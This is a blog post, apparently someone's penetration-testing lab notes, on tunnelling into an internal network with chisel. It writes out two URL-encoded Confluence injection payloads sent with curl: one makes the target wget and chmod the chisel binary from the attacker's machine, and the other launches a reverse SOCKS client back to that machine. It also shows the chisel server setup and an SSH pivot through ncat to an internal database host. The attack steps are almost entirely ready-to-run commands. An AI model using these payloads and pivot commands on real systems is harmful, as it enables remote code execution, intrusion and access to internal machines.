---
layout: post
title: HTTP Tunneling
titledate: 09/24/23
tags: ["infosec", "offsec", "tunnel", "chisel", "ncat"]
---

#### chisel

the chisel tool will create a http tunnel that encapsulates an ssh session

chisel needs a client and server connection, so we need to run chisel on our target

    $ sudo cp $(which chisel) .

    $ python -m http.server 80

now we need to grab chisel on the target, and for this attack we leverage the confluence vulnerability to execute a bash wget command to retrieve our chisel binary

    $ curl http://192.168.50.50:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.1.1/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/

we start the server on our attacking machine

    $ chisel server --port 8080 --reverse

on our attacking machine we dump the tcp traffic on the interface that chisel will be communicating on

    $ sudo tcpdump -nvvvXi tun0 tcp port 8080

once our target1 has the chisel binary we can execute the client , from a web shell, cmd shell etc

    /tmp/chisel client 192.168.1.1:8080 R:socks > /dev/null 2>&1 & 

we can also start the client using the verified confluence injection payload we used to retrieve the binary, but now lets us execute a command

    $ curl http://192.168.50.50:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.1.1:8080%20R:socks%27%29.start%28%29%22%29%7D/

our chisel server should now have an inbound connection from the client

we can use ncat to pass a proxy command to ssh's proxycommand 

    $ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.50

now we've established an ssh connection to a pg db machine on an internal network via chisel reverse socks proxy tunneled through a reverse http tunnel

### NOTE: may need to try different versions of chisel for compatibility